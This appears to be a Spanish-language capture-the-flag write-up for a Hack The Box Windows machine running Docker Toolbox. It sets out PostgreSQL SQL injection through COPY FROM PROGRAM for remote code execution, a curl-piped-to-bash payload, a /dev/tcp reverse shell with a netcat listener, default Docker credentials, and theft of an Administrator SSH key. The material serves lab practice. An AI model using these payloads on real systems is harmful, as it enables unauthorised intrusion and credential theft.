## Summary

Tags: #Window #FTP #SSH #ID_RSA #Docker #Contenedor #HTTPS #PostgreSQL #ReverShell #Nmap #Curl 

- IP -> 10.10.10.236
- Ports -> TCP (21, 22, 443, 445), UDP (idk)
- OS ->  Windows
- Services & Applications
    - 21 -> FileZilla ftpd
    - 22 -> OpenSSH for_windows_7.7
    - 443 -> Apache httpd 2.4.38

## Launchpad

-   [Launchpad](https://launchpad.net/ubuntu)
-   [RCE-Postgresql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
-   [Docker-Toolbox](https://stackoverflow.com/questions/32646952/docker-machine-boot2docker-root-password)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts  # Escaneo de todos los puertos

❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

```bash 
❯ ftp ❮IP❯             # Si el servidor nos lo permite nos podemos conectar como Anonymous sin password
	❯ binary          # Para poder descargar un archivo exe y que no nos de problemas
	❯ get ❮File❯      # Para descargar un archivo desde el FTP
```

```bash 
❯ openssl s_client -connect ❮dominio.com❯:443   # Para conectarnos al openssl e inspeccionar el certificado

# Agregamos el dominio encontrado al '/etc/hosts'
```

```bash 
# Investigamos la pagina y encontramos un 'Admin Panel', por lo que procedemos a ver si tiene inyecciones SQL

1. Primero probamos con una '

# Al momento de ingresar una ' nos muestra un error y que la DB es 'Pg = Postgresql'

2. Abrimos el 'Burpsuite' y buscamos en 'Google' como hacer inyecciones en Postgresql, por lo que encontramos que se puede hacer un RCE poe medio de la creacion de una tabla en la cual podemos inyectar comandos. 

# Lo siguiente lo haremos en sl 'Burpsuite'
❯ '; CREATE TABLE cmd_exec(cmd_output text);-- -     # Creamos la tabla 
❯ '; COPY cmd_exec FROM PROGRAM 'curl 10.10.14.26';-- -            # Ingresamos el comando a ejecutar y es para verificar si la maquina victima tiene conexion a nuestra maquina de atacante
```

## User

```
❯ '; COPY cmd_exec FROM PROGRAM 'curl http://10.10.14.26 | bash ';-- -  # Para que nos interprete el codigo y nos ejecute la revershell
```

```bash
❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar

❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

```bash 
❯ nc -nlvp 443  # Nos ponemos en esucha para recibir la revershell 
```

```bash 
# Ingresamos al contenedor que en este caso es Linux


❯ script /dev/null -c bash                               # Inicio del tratamiento de la consola 
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

❯ export TERM=xterm-256color                             # Para que la shell tenga colores 
	❯ source /etc/skel/.bashrc

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189  
```

```bash 
❯ ifconfig      # Mirar las interfaces y nos encontramos en un contenedor por la IP '172.17.0.2'

# Como en todo contendor debemos de mirar los puertos abiertos en la IP con la que tenemos conexion '172.17.0.1' 
❯ (echo ‘’ > /dev/tcp/172.16.0.1/22) 2>/dev/null && echo “[+] Puerto abierto” || echo “[+] Puerto cerrado”
```

```bash
❯  ssh docker@172.17.0.1        # Para conectarnos por ssh en el puerto default 22 del contenedor docker, las credenciales son la de defaul y las encontramos investigando en 'Google' buscando 'password docker-toolbox'
```

```bash
❯ whoami                                           # Miramos el nombre del usuario
```

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
```

```bash
❯ find  / -name user.txt 2>/dev/null               # Para buscar un archivo en el sistema desde la raiz
```

## Root

```bash 
Encontramos un dir '.ssh' en el dir de 'Administrator' del contenedor de docker. Copiamos su contenido en nuestra maquina de atacante en un archivo llamada 'id_rsa' y le damos el privilegio 600

❯ chmod 600 id_rsa                              # Para darle un permiso 600 a la id_rsa      
```

```bash
❯ ssh -i id_rsa Administrator@10.10.10.236      # Nos conectamos desde nuestra maquina de atacante por ssh teniendo un id_rsa con privilegio 600 al puerto 22 que se encuentra abierto en la maquina Windows
```

```bash
❯ whoami                                           # Miramos el nombre del usuario
```

```bash
❯ ipconfig                                         # Nos muestra las interfaces y las direcciones IP de Windows
```